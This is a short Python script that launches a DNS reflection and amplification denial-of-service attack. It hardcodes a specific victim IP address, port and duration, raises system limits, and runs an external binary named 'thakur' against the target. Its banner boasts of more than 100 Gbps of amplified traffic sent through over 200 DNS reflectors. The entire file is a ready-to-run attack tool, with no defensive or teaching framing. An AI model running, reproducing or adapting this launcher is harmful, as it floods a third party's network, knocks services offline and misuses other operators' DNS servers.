#!/usr/bin/env python3
import os
import subprocess
import sys

BINARY = "./thakur"
VICTIM_IP = "147.75.202.61"
VICTIM_PORT = "53"
DURATION = "200"

def setup_limits():
    print("[+] Setting system limits for maximum performance...")
    os.system("ulimit -n 100000 2>/dev/null")
    print("[+] System limits configured.\n")

def main():
    setup_limits()
    
    # Ensure binary is executable
    if os.path.exists(BINARY):
        os.system(f"chmod +x thakur")
    else:
        print(f"[-] Binary '{BINARY}' not found!")
        sys.exit(1)
    
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║     JANUS DNS REFLECTION - 100+ Gbps AMPLIFIED TO VICTIM     ║
╚══════════════════════════════════════════════════════════════╝

🎯 Victim IP      : {VICTIM_IP}
🔌 Victim Port    : {VICTIM_PORT}
⏱️  Duration       : {DURATION} seconds
🌐 DNS Reflectors : 200+ working UDP servers
💣 Amplification  : 70x (KB queries → MB responses)

🔥 LAUNCHING ATTACK...
""")
    
    cmd = [BINARY, VICTIM_IP, VICTIM_PORT, DURATION]
    subprocess.run(cmd)

if __name__ == "__main__":
    main()
